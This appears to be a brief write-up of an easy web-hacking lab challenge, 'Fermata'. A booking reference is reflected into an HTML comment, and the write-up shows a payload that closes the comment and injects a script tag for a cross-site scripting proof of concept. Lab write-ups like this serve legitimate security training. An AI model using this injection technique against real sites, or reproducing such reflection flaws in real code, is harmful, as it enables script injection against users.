---

Name: Fermata
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/07/Fermata
Description: Fermata connects clients with piano tuners. An old debug line left over from development drops the booking reference into an HTML comment so ops can scan View Source for bad IDs. It never occurred to anyone that comments are just text, not a fence. 

---

After booking a tunning we are redirected to `/book?ref=FM-2026-F0FF30` and an HTML comment is added
```html
<!-- debug:booking-ref FM-2026-7941FF -->
```

Simply adding an XSS payload won't work:
```html
<script>alert("Hacked")</script>
```

As it will just become a comment

First we have to escape the comment:
```html
--><script>alert("Hacked")</script><!--
```
